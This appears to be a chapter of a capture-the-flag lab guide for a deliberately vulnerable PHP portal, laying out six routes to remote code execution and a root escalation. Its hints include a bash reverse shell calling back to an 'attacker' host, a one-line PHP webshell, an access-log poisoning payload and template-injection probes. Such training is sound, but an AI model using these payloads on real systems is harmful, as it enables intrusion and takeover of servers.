# Chapter 09 — "Foothold"  ·  Web RCE → Reverse Shell → Root

> **Host:** `hollow-portal-01` (compose service `target-web`)
> **Entry point:** the web app at **`http://127.0.0.1:8080/`** (no SSH, no account — you're an external attacker)
> **Objective:** get RCE → reverse shell as `www-data` → **root**, read `/root/flag.txt`
> **Difficulty:** ★☆☆☆ → ★★★☆ (six independent RCE routes, easy to hard)

---

## 📻 Mission brief

Every other chapter hands you a shell. This one hands you a URL.

Hollow Industries put an internal file-sharing and support portal — **Hollow
Share**, Apache + PHP — on the perimeter. BlackReef wants to know how far a
stranger with nothing but a browser can get. You start **outside**: no SSH key,
no password, no account. Your job is to turn the web app into code execution,
catch a reverse shell, and climb to root.

> **The whole idea in one line:** a web app is a program that runs attacker
> input. Find the input that reaches a shell, an `include()`, a template
> engine, or `unserialize()`, and you are running code on the server.

This is the "how the breach happens" prequel to the assume-breach chapters. The
reverse shell is not the finish line — it is the **foothold**. You land as
`www-data`; root is a short step further.

---

## 🎯 Objective & rules of engagement

- **Foothold flag:** `/var/www/flag.txt` — readable by `www-data`. Proves you
  have code execution / a shell on the box.
- **Final flag:** `/root/flag.txt` — only root can read it. Proves the full
  kill chain. Both are `R2R{...}`.
- **In scope:** this container only. **Never** expose it off your machine — it
  is deliberately, thoroughly broken.
- **Connect:** browse to `http://127.0.0.1:8080/` and point Burp Suite at it.
  Reverse shells call back to the attacker box (`attacker`, on `labnet`):
  bring it up with `make up-web` and `make attacker`.
- There are **six independent routes** to code execution. You need one to land
  a shell; a good operator finds them all.

---

## 🔍 Recon starter

Map the app before you attack it. Open every page and watch what each input does:

```bash
# from the attacker box (or your host browser + Burp):
curl -s http://target-web/            # the landing page lists every feature
# then walk each one:
#   /upload.php    — takes any file?
#   /share.php     — "images only" — how is that enforced?
#   /tools.php     — a ping box that runs a command
#   /view.php?page=…  — what does `page` control?
#   /preview.php   — renders your text… how?
#   /prefs.php     — sets a cookie… what's inside it?
```

For each input, ask:

1. Does this value **land on disk** somewhere the web server will run it as code?
2. Does this value reach a **shell** (`system`, `exec`, backticks)?
3. Does this value get **included** as a file (`include`, `require`)?
4. Does this value get **rendered as a template** (`{{ }}` evaluates)?
5. Is this value **`unserialize()`d** (a serialized object in a cookie/param)?

Each "yes" is a station.

---

## 🗺️ The six routes to RCE

| # | Feature | The bug | Difficulty |
|---|---------|---------|:----------:|
| A | Upload a file | No validation — upload `shell.php`, browse to it | ★☆☆☆ |
| B | Share an image | Deny-list + `Content-Type` check — both bypassable | ★★☆☆ |
| C | Network tools (ping) | User input concatenated into a shell command | ★★☆☆ |
| D | Help viewer (`?page=`) | Includes any file → log poisoning / wrapper RCE | ★★★☆ |
| E | Greeting preview | Your text is compiled as a Twig template (SSTI) | ★★★☆ |
| F | Preferences cookie | A serialized object is `unserialize()`d (gadget) | ★★★☆ |

**Then the capstone (all six converge here):** once you have a `www-data`
shell, escalate to root. The box's maintenance config is the lever — enumerate
what the web user is allowed to do.

### Hints (open only when stuck)

<details><summary>Landing a reverse shell (read this first)</summary>

Every route lets you run a command as `www-data`. Turn that into an interactive
shell on your attacker box:

```bash
# on the attacker:
nc -lvnp 4444
# the command the web app runs (bash, not sh — /dev/tcp is a bash feature):
bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'
```

Then upgrade the dumb shell to a real TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z, then:  stty raw -echo; fg  , then:  export TERM=xterm
```

</details>

<details><summary>Station A — unrestricted upload</summary>

The upload page accepts *any* file and serves it back under `/uploads/`. Upload
a one-line PHP webshell (`<?php system($_GET['c']); ?>`) and request it with a
`?c=` command. From there, a reverse shell.

</details>

<details><summary>Station B — "images only" is a lie</summary>

The share page blocks a deny-list of extensions and checks the `Content-Type`.
Both are attacker-controlled. The deny-list misses some PHP-capable extensions,
the server runs more than just `.php`, the `Content-Type` is whatever you send,
and the directory honours an uploaded `.htaccess`. Combine a non-blocked
extension, `GIF89a` magic bytes, and a spoofed `image/gif` type.

</details>

<details><summary>Station C — the ping box</summary>

`tools.php` runs `ping -c 1 <your input>`. Shell metacharacters in the host
field (`;`, `|`, `$( )`, `&&`) run as `www-data`. No escaping, no allow-list.

</details>

<details><summary>Station D — the page viewer</summary>

`view.php?page=` includes whatever path you give it. That is arbitrary file
read (`/etc/passwd`), source disclosure (`php://filter/convert.base64-encode/
resource=prefs.php`), and RCE. For RCE, get PHP into a file you can include:
poison the Apache access log via a `User-Agent` of `<?php system($_GET['c']);?>`
then include the log, or use the `data://` / `php://input` wrappers.

</details>

<details><summary>Station E — the greeting preview</summary>

`preview.php` renders your `name` through the Twig template engine by building
the template *from your input*. Confirm with `{{7*7}}` — if the page shows `49`,
it is template injection, not just reflected text. From there, a Twig gadget
reaches PHP functions.

</details>

<details><summary>Station F — the prefs cookie</summary>

`prefs.php` stores a base64'd serialized PHP object in the `prefs` cookie and
`unserialize()`s it on every load. `unserialize()` will rebuild *any* class in
scope and fire its magic methods. Look for a class with a dangerous
`__wakeup()` / `__destruct()` and craft a cookie that instantiates it.

</details>

<details><summary>Capstone — www-data → root</summary>

You are `www-data`. Enumerate your privileges the way you would on any box:

```bash
sudo -l
```

If the web user may run an interpreter as root with no password, that
interpreter is a root shell.

</details>

---

## 🏁 Capture

```bash
# foothold (in your www-data reverse shell):
id                      # uid=33(www-data)
cat /var/www/flag.txt   # R2R{...}  — the foothold flag

# root:
sudo -l                 # what may www-data run as root?
# … escalate …
id                      # uid=0(root)
cat /root/flag.txt      # R2R{...}  — the final flag
```

Got all six routes to a shell, then root? You've walked the whole kill chain
from the outside in. Write the blue-team debrief.

---

## 📖 Debrief (spoilers)

Full walkthrough of all six routes **plus** the reverse-shell catalog, the
capstone, and **how to detect and fix** each — is in
**[WRITEUP.md](WRITEUP.md)**. Try the box first; the debrief is worth far more
after you've struggled with it.
